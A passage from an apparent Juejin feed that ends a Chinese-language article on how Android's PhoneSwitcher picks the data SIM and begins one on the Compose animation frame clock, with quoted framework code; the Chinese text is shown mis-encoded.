            if (mPhoneSubscriptions[phoneId] == fallbackSubId) {
                return phoneId;
            }
        }
    }
    return SubscriptionManager.INVALID_PHONE_INDEX;
}
</code></pre>
<p><strong>æ™ºèƒ½åˆ‡æ¢</strong>ï¼šç³»ç»Ÿå¯èƒ½å› ä¸ºä¿¡å·è´¨é‡ç­‰åŸå› è‡ªåŠ¨é€‰æ‹©çš„æ•°æ®å¡ã€‚</p>
<h4 data-id="heading-6"><strong>4. ç”¨æˆ·è®¾ç½®çš„ä¸»æ•°æ®å¡ (Primary Data Sub)</strong></h4>
<pre><code class="hljs language-1165:1171:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1165:1171:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">// Check if user setting of default non-opportunistic data sub is changed.
int primaryDataSubId = mSubscriptionManagerService.getDefaultDataSubId();
if (primaryDataSubId != mPrimaryDataSubId) {
    sb.append(" mPrimaryDataSubId ").append(mPrimaryDataSubId).append("-&gt;")
        .append(primaryDataSubId);
    mPrimaryDataSubId = primaryDataSubId;
    mLastSwitchPreferredDataReason = DataSwitch.Reason.DATA_SWITCH_REASON_MANUAL;
</code></pre>
<p><strong>é»˜è®¤é€‰æ‹©</strong>ï¼šç”¨æˆ·åœ¨è®¾ç½®ä¸­é€‰æ‹©çš„é»˜è®¤æ•°æ®å¡ã€‚</p>
<h3 data-id="heading-7"><strong>å°„é¢‘èµ„æºåˆ†é…æ–¹å¼</strong></h3>
<p>æ ¹æ® Modem èƒ½åŠ›ï¼Œæœ‰ä¸¤ç§åˆ†é…æ–¹å¼ï¼š</p>
<h4 data-id="heading-8"><strong>æ–¹å¼ 1: HAL_COMMAND_PREFERRED_DATA (æ–°)</strong></h4>
<pre><code class="hljs language-1236:1243:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1236:1243:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">if (mHalCommandToUse == HAL_COMMAND_PREFERRED_DATA) {
    // With HAL_COMMAND_PREFERRED_DATA, all phones are assumed to allow PS attach.
    // So marking all phone as active, and the phone with mPreferredDataPhoneId
    // will send radioConfig command.
    for (int phoneId = 0; phoneId &lt; mActiveModemCount; phoneId++) {
        mPhoneStates[phoneId].active = true;
    }
    sendRilCommands(mPreferredDataPhoneId);
</code></pre>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæ‰€æœ‰ Phone éƒ½æ ‡è®°ä¸º active</li>
<li><strong>Modem æ§åˆ¶</strong>ï¼šé€šè¿‡ <code>setPreferredDataModem()</code> å‘Šè¯‰ Modem å“ªä¸ªæ˜¯é¦–é€‰æ•°æ®å¡</li>
<li><strong>ç°ä»£è®¾å¤‡</strong>ï¼šæ”¯æŒåŠ¨æ€åˆ‡æ¢</li>
</ul>
<h4 data-id="heading-9"><strong>æ–¹å¼ 2: HAL_COMMAND_ALLOW_DATA (æ—§)</strong></h4>
<pre><code class="hljs language-1244:1296:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1244:1296:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">} else {
    List&lt;Integer&gt; newActivePhones = new ArrayList&lt;&gt;();

    // If all phones can have PS attached, activate all.
    // Otherwise, choose to activate phones according to requests. And
    // if list is not full, add mPreferredDataPhoneId.
    if (mMaxDataAttachModemCount == mActiveModemCount) {
        for (int i = 0; i &lt; mMaxDataAttachModemCount; i++) {
            newActivePhones.add(i);
        }
    } else {
        // First try to activate phone in voice call.
        if (mPhoneIdInVoiceCall != SubscriptionManager.INVALID_PHONE_INDEX) {
            newActivePhones.add(mPhoneIdInVoiceCall);
        }

        if (newActivePhones.size() &lt; mMaxDataAttachModemCount) {
            for (TelephonyNetworkRequest networkRequest : mNetworkRequestList) {
                int phoneIdForRequest = phoneIdForRequest(networkRequest);
                if (phoneIdForRequest == INVALID_PHONE_INDEX) continue;
                if (newActivePhones.contains(phoneIdForRequest)) continue;
                newActivePhones.add(phoneIdForRequest);
                if (newActivePhones.size() &gt;= mMaxDataAttachModemCount) break;
            }
        }

        if (newActivePhones.size() &lt; mMaxDataAttachModemCount
                &amp;&amp; !newActivePhones.contains(mPreferredDataPhoneId)
                &amp;&amp; SubscriptionManager.isUsableSubIdValue(mPreferredDataPhoneId)) {
            newActivePhones.add(mPreferredDataPhoneId);
        }
    }

    if (VDBG) {
        log("mPrimaryDataSubId = " + mPrimaryDataSubId);
        log("mAutoSelectedDataSubId = " + mAutoSelectedDataSubId);
        for (int i = 0; i &lt; mActiveModemCount; i++) {
            log(" phone[" + i + "] using sub[" + mPhoneSubscriptions[i] + "]");
        }
        log(" newActivePhones:");
        for (Integer i : newActivePhones) log("  " + i);
    }

    for (int phoneId = 0; phoneId &lt; mActiveModemCount; phoneId++) {
        if (!newActivePhones.contains(phoneId)) {
            deactivate(phoneId);
        }
    }

    // only activate phones up to the limit
    for (int phoneId : newActivePhones) {
        activate(phoneId);
    }
}
</code></pre>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šé€‰æ‹©æ€§æ¿€æ´» Phone</li>
<li><strong>ä¼˜å…ˆçº§é¡ºåº</strong>ï¼š
<ol>
<li>è¯­éŸ³é€šè¯ä¸­çš„å¡</li>
<li>æœ‰ç½‘ç»œè¯·æ±‚çš„å¡</li>
<li>é¦–é€‰æ•°æ®å¡</li>
</ol>
</li>
<li><strong>Android æ§åˆ¶</strong>ï¼šé€šè¿‡ <code>setDataAllowed()</code> æ§åˆ¶æ¯ä¸ª Phone æ˜¯å¦å…è®¸ PS Attach</li>
</ul>
<h3 data-id="heading-10"><strong>æœ€ç»ˆæ‰§è¡Œï¼šå‘é€ RIL å‘½ä»¤</strong></h3>
<pre><code class="hljs language-1364:1381:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1364:1381:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">protected void sendRilCommands(int phoneId) {
    if (!SubscriptionManager.isValidPhoneId(phoneId)) {
        logl("sendRilCommands: skip dds switch due to invalid phoneId=" + phoneId);
        return;
    }

    Message message = Message.obtain(this, EVENT_MODEM_COMMAND_DONE, phoneId);
    if (mHalCommandToUse == HAL_COMMAND_ALLOW_DATA || mHalCommandToUse == HAL_COMMAND_UNKNOWN) {
        // Skip ALLOW_DATA for single SIM device
        if (mActiveModemCount &gt; 1) {
            PhoneFactory.getPhone(phoneId).mCi.setDataAllowed(isPhoneActive(phoneId), message);
        }
    } else if (phoneId == mPreferredDataPhoneId) {
        // Only setPreferredDataModem if the phoneId equals to current mPreferredDataPhoneId
        logl("sendRilCommands: setPreferredDataModem - phoneId: " + phoneId);
        mRadioConfig.setPreferredDataModem(mPreferredDataPhoneId, message);
    }
}
</code></pre>
<h2 data-id="heading-11">æ€»ç»“ï¼šå†³ç­–æµç¨‹å›¾</h2>
<pre><code class="hljs language-text" lang="text">ç”¨æˆ·æ“ä½œ/ç³»ç»Ÿäº‹ä»¶
    â†“
onEvaluate()
    â†“
updatePreferredDataPhoneId()
    â”œâ”€ 1. æœ‰ç´§æ€¥å‘¼å«? â†’ ä½¿ç”¨ç´§æ€¥å‘¼å«å¡
    â”œâ”€ 2. æœ‰è¯­éŸ³é€šè¯? â†’ (æ¡ä»¶æ»¡è¶³)ä½¿ç”¨è¯­éŸ³å¡
    â”œâ”€ 3. æœ‰è‡ªåŠ¨é€‰æ‹©? â†’ ä½¿ç”¨è‡ªåŠ¨é€‰æ‹©å¡
    â””â”€ 4. å¦åˆ™ â†’ ä½¿ç”¨ä¸»æ•°æ®å¡
    â†“
æ ¹æ® Modem èƒ½åŠ›é€‰æ‹©æ–¹å¼
    â”œâ”€ HAL_COMMAND_PREFERRED_DATA
    â”‚   â”œâ”€ æ‰€æœ‰ Phone æ ‡è®° active
    â”‚   â””â”€ setPreferredDataModem(phoneId)
    â”‚
    â””â”€ HAL_COMMAND_ALLOW_DATA
        â”œâ”€ é€‰æ‹©æ¿€æ´»çš„ Phone (æœ€å¤š mMaxDataAttachModemCount)
        â”‚   â”œâ”€ è¯­éŸ³é€šè¯ä¸­çš„
        â”‚   â”œâ”€ æœ‰ç½‘ç»œè¯·æ±‚çš„
        â”‚   â””â”€ é¦–é€‰æ•°æ®å¡
        â””â”€ setDataAllowed(phoneId, true/false)
    â†“
Modem æ‰§è¡Œå°„é¢‘èµ„æºåˆ†é…
</code></pre>
<p>å…³é”®å°±æ˜¯ <strong><code>onEvaluate()</code> â†’ <code>updatePreferredDataPhoneId()</code> â†’ <code>sendRilCommands()</code></strong> è¿™æ¡ä¸»çº¿ï¼</p>
<h3 data-id="heading-12"><strong>sendRilCommands() å…·ä½“å¹²äº†ä»€ä¹ˆï¼Ÿ</strong></h3>
<ol>
<li>
<p><strong>æ£€æŸ¥ phoneId æœ‰æ•ˆæ€§</strong></p>
</li>
<li>
<p><strong>åˆ›å»º Message ç”¨äºæ¥æ”¶ Modem å“åº”</strong>Â (<code>EVENT_MODEM_COMMAND_DONE</code>)</p>
</li>
<li>
<p><strong>æ ¹æ® Modem èƒ½åŠ›é€‰æ‹©å‘½ä»¤</strong>:</p>
<ul>
<li>æ—§ Modem: è°ƒç”¨Â <code>setDataAllowed(phoneId, active)</code>Â å•ç‹¬æ§åˆ¶æ¯ä¸ª Phone</li>
<li>æ–° Modem: è°ƒç”¨Â <code>setPreferredDataModem(modemId)</code>Â å‘Šè¯‰ Modem é¦–é€‰å“ªä¸ª</li>
</ul>
</li>
<li>
<p><strong>é€šè¿‡ RIL â†’ RadioProxy â†’ HIDL/AIDL â†’ RILD â†’ Vendor RIL</strong>Â å‘é€å‘½ä»¤åˆ° Modem</p>
</li>
<li>
<p><strong>Modem æ‰§è¡Œå°„é¢‘èµ„æºåˆ‡æ¢</strong>ï¼Œå…è®¸/ç¦æ­¢ç‰¹å®š SIM å¡çš„æ•°æ®è¿æ¥</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ComposeåŸç†ä¸ƒä¹‹åŠ¨ç”»]]></title>    <link>https://juejin.cn/post/7602464510607769626</link>    <guid>https://juejin.cn/post/7602464510607769626</guid>    <pubDate>2026-02-03T14:45:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602464510607769626" data-draft-id="7600291308409733174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ComposeåŸç†ä¸ƒä¹‹åŠ¨ç”»"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2026-02-03T14:45:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è£´äº‘é£"/> <meta itemprop="url" content="https://juejin.cn/user/3734361144570285"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ComposeåŸç†ä¸ƒä¹‹åŠ¨ç”»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3734361144570285/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è£´äº‘é£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:45:07.000Z" title="Tue Feb 03 2026 14:45:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å‰è¨€</h2>
<p>ComposeåŠ¨ç”»åŸç†è·Ÿå‰¯ä½œç”¨å’Œåç¨‹ä¸Šä¸‹æ–‡æ¯æ¯ç›¸å…³ï¼Œä¸ç†Ÿæ‚‰å‰¯ä½œç”¨ï¼Œå¯ä»¥æŸ¥çœ‹<a href="https://juejin.cn/post/7599017594519322650" target="_blank" title="https://juejin.cn/post/7599017594519322650">ComposeåŸç†äº”ä¹‹å‰¯ä½œç”¨</a>ï¼›ä¸ç†Ÿæ‚‰åç¨‹ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥æŸ¥çœ‹<a href="https://juejin.cn/post/7600291308409716790" target="_blank" title="https://juejin.cn/post/7600291308409716790">ComposeåŸç†å…­ä¹‹Kotlinåç¨‹ä¸Šä¸‹æ–‡</a>ã€‚</p>
<h2 data-id="heading-1">äºŒã€å¸§é©±åŠ¨æœºåˆ¶ï¼šMonotonicFrameClock</h2>
<h3 data-id="heading-2">2ã€1 MonotonicFrameClock æ¥å£å®šä¹‰</h3>
<p><code>MonotonicFrameClock</code> æ˜¯ Compose å®šä¹‰çš„ä¸€ä¸ª <code>CoroutineContext.Element</code>ï¼Œç”¨äºæä¾›å¸§åŒæ­¥æœåŠ¡ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// MonotonicFrameClock.kt</span>

<span class="hljs-comment">/**
 * æä¾›æ˜¾ç¤ºå¸§çš„æ—¶é—´æºï¼Œä»¥åŠåœ¨ä¸‹ä¸€å¸§æ‰§è¡Œæ“ä½œçš„èƒ½åŠ›
 * å¯ç”¨äºä¸æ˜¾ç¤ºåˆ·æ–°ç‡åŒ¹é…ï¼Œæˆ–è€…åŒæ­¥å·¥ä½œåˆ°æœŸæœ›çš„å¸§ç‡
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MonotonicFrameClock</span> : <span class="hljs-type">CoroutineContext.Element</span> {
    <span class="hljs-comment">/**
     * æŒ‚èµ·ç›´åˆ°è¯·æ±‚æ–°å¸§ï¼Œç«‹å³è°ƒç”¨ onFrame å¹¶ä¼ å…¥å¸§æ—¶é—´ï¼ˆçº³ç§’ï¼‰
     * 
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">frameTimeNanos</span>: <span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R
    
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> key: CoroutineContext.Key&lt;*&gt;
        <span class="hljs-keyword">get</span>() = Key

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> Key : CoroutineContext.Key&lt;MonotonicFrameClock&gt;
}
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ol>
<li>å®ƒæ˜¯ä¸€ä¸ª <code>CoroutineContext.Element</code>ï¼Œå¯ä»¥é€šè¿‡ <code>+</code> æ·»åŠ åˆ°åç¨‹ä¸Šä¸‹æ–‡</li>
<li>å®ƒæä¾›äº† <code>withFrameNanos</code> æŒ‚èµ·å‡½æ•°ï¼Œç”¨äºç­‰å¾…ä¸‹ä¸€å¸§</li>
<li>ä½¿ç”¨ <code>MonotonicFrameClock.Key</code> ä½œä¸ºå”¯ä¸€æ ‡è¯†</li>
</ol>
<h3 data-id="heading-3">2ã€2 ä»åç¨‹ä¸Šä¸‹æ–‡è·å–å¸§æ—¶é’Ÿ</h3>
<p>ä»»ä½•åœ¨åç¨‹ä¸­è¿è¡Œçš„ä»£ç ï¼Œéƒ½å¯ä»¥é€šè¿‡ <code>coroutineContext</code> è·å–å¸§æ—¶é’Ÿï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// MonotonicFrameClock.kt</span>
<span class="hljs-meta">@ExperimentalComposeApi</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> CoroutineContext.monotonicFrameClock: MonotonicFrameClock
    <span class="hljs-keyword">get</span>() = <span class="hljs-keyword">this</span>[MonotonicFrameClock]
        ?: error(
            <span class="hljs-string">"A MonotonicFrameClock is not available in this CoroutineContext. "</span> +
                <span class="hljs-string">"Callers should supply an appropriate MonotonicFrameClock using withContext."</span>
        )

<span class="hljs-comment">// é¡¶çº§æŒ‚èµ·å‡½æ•°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">frameTimeNanos</span>: <span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R =
    coroutineContext.monotonicFrameClock.withFrameNanos(onFrame)
</code></pre>
<p><strong>ä½¿ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">LaunchedEffect(<span class="hljs-built_in">Unit</span>) {
    <span class="hljs-comment">// ç­‰å¾…ä¸‹ä¸€å¸§</span>
    <span class="hljs-keyword">val</span> frameTime = withFrameNanos { it }
    println(<span class="hljs-string">"å½“å‰å¸§æ—¶é—´: <span class="hljs-variable">$frameTime</span>"</span>)
}
</code></pre>
<h3 data-id="heading-4">2ã€3 AndroidUiFrameClock</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AndroidUiFrameClock</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">constructor</span>(
    <span class="hljs-keyword">val</span> choreographer: Choreographer,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> dispatcher: AndroidUiDispatcher?,
) : androidx.compose.runtime.MonotonicFrameClock {

    <span class="hljs-keyword">constructor</span>(choreographer: Choreographer) : <span class="hljs-keyword">this</span>(choreographer, <span class="hljs-literal">null</span>)

    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R {
        <span class="hljs-keyword">val</span> uiDispatcher =
            dispatcher ?: coroutineContext[ContinuationInterceptor] <span class="hljs-keyword">as</span>? AndroidUiDispatcher
        <span class="hljs-keyword">return</span> suspendCancellableCoroutine { co -&gt;
            <span class="hljs-comment">// Important: this callback won't throw, and AndroidUiDispatcher counts on it.</span>
            <span class="hljs-keyword">val</span> callback =
                Choreographer.FrameCallback { frameTimeNanos -&gt;
                    co.resumeWith(runCatching { onFrame(frameTimeNanos) })
                }                
            <span class="hljs-comment">// æ³¨å†Œå¸§å›è°ƒ</span>
            <span class="hljs-keyword">if</span> (uiDispatcher != <span class="hljs-literal">null</span> &amp;&amp; uiDispatcher.choreographer == choreographer) {
                <span class="hljs-comment">// æƒ…å†µ Aï¼šä½¿ç”¨ AndroidUiDispatcher æ³¨å†Œ</span>
                uiDispatcher.postFrameCallback(callback)
                co.invokeOnCancellation { uiDispatcher.removeFrameCallback(callback) }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// æƒ…å†µ Bï¼šç›´æ¥ä½¿ç”¨ Choreographer æ³¨å†Œ</span>
                choreographer.postFrameCallback(callback)
                co.invokeOnCancellation { choreographer.removeFrameCallback(callback) }
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-5">ä¸ºä»€ä¹ˆéœ€è¦ä¸¤ç§æ³¨å†Œæ–¹å¼ï¼Ÿ</h4>
<p>æ ¸å¿ƒç›®çš„æ˜¯ä¸ºäº†è§£å†³<strong>å¸§å†…ä»»åŠ¡è°ƒåº¦çš„é¡ºåºå’Œåˆå¹¶</strong>é—®é¢˜ã€‚</p>
<h4 data-id="heading-6">æƒ…å†µ Aï¼šä½¿ç”¨ AndroidUiDispatcher æ³¨å†Œ</h4>
<p>å½“æˆ‘ä»¬åœ¨ Compose ç¯å¢ƒä¸­ï¼ˆé€šå¸¸åœ¨ <code>AndroidUiDispatcher.Main</code> ä¸Šä¸‹æ–‡ä¸­ï¼‰è°ƒç”¨ <code>withFrameNanos</code> æ—¶ï¼Œä¼šè¿›å…¥è¿™ä¸ªåˆ†æ”¯ã€‚</p>
<p><code>AndroidUiDispatcher</code> å®ç°äº†ä¸€ä¸ªéå¸¸é‡è¦çš„æœºåˆ¶ï¼š<strong>Trampoline Dispatchï¼ˆè·³æ¿åˆ†å‘ï¼‰</strong>ã€‚</p>
<p>å¦‚æœä¸ä½¿ç”¨ <code>uiDispatcher</code>ï¼Œæ¯æ¬¡è°ƒç”¨ <code>withFrameNanos</code> éƒ½ä¼šç›´æ¥å‘ Choreographer æ³¨å†Œä¸€ä¸ª FrameCallbackã€‚</p>
<p><strong>é—®é¢˜åœºæ™¯ï¼š</strong>
å‡è®¾ä½ åœ¨åŒä¸€å¸§å†…å¤šæ¬¡è°ƒç”¨ <code>withFrameNanos</code>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// å‡è®¾è¿™é‡Œç›´æ¥ä½¿ç”¨ choreographer.postFrameCallback</span>
withFrameNanos { ... } <span class="hljs-comment">// æ³¨å†Œå›è°ƒ 1</span>
withFrameNanos { ... } <span class="hljs-comment">// æ³¨å†Œå›è°ƒ 2</span>
withFrameNanos { ... } <span class="hljs-comment">// æ³¨å†Œå›è°ƒ 3</span>
</code></pre>
<p>Choreographer ä¼šæ”¶åˆ° 3 ä¸ªå›è°ƒï¼Œå¹¶åœ¨ä¸‹ä¸€å¸§ä¾æ¬¡æ‰§è¡Œå®ƒä»¬ã€‚è¿™è™½ç„¶æ²¡é”™ï¼Œä½†å¯èƒ½æ•ˆç‡ä¸é«˜ï¼Œä¸”æ— æ³•æ§åˆ¶æ‰§è¡Œé¡ºåºä¸ UI å¸ƒå±€/ç»˜åˆ¶çš„å…³ç³»ã€‚</p>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼ˆAndroidUiDispatcherï¼‰ï¼š</strong>
<code>AndroidUiDispatcher</code> å°†è¿™äº›å›è°ƒ<strong>æ”¶é›†èµ·æ¥</strong>ï¼Œå¹¶ç¡®ä¿å®ƒä»¬åœ¨**è´ªå©ªçš„è·³æ¿åˆ†å‘ï¼ˆgreedy trampoline dispatchï¼‰**ä¹‹åæ‰§è¡Œã€‚</p>
<p>çœ‹çœ‹ <code>AndroidUiDispatcher.postFrameCallback</code> çš„å®ç°ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// AndroidUiDispatcher.android.kt</span>
<span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">postFrameCallback</span><span class="hljs-params">(callback: <span class="hljs-type">Choreographer</span>.<span class="hljs-type">FrameCallback</span>)</span></span> {
    synchronized(lock) {
        toRunOnFrame.add(callback) <span class="hljs-comment">// 1. åªæ˜¯æ·»åŠ åˆ°åˆ—è¡¨ï¼Œä¸ç«‹å³æ³¨å†Œåˆ° Choreographer</span>
        <span class="hljs-keyword">if</span> (!scheduledFrameDispatch) {
            scheduledFrameDispatch = <span class="hljs-literal">true</span>
            choreographer.postFrameCallback(dispatchCallback) <span class="hljs-comment">// 2. åªæœ‰ç¬¬ä¸€æ¬¡æ‰æ³¨å†Œä¸€ä¸ªç»Ÿä¸€çš„å›è°ƒ</span>
        }
    }
}
</code></pre>
<p>è¿™æ„å‘³ç€ï¼Œæ— è®ºä½ è°ƒç”¨å¤šå°‘æ¬¡ <code>withFrameNanos</code>ï¼Œ<code>AndroidUiDispatcher</code> åªä¼šå‘ç³»ç»Ÿ Choreographer æ³¨å†Œ<strong>ä¸€ä¸ª</strong> <code>dispatchCallback</code>ã€‚</p>
<p>å½“è¿™ä¸ª <code>dispatchCallback</code> æ‰§è¡Œæ—¶ï¼š</p>
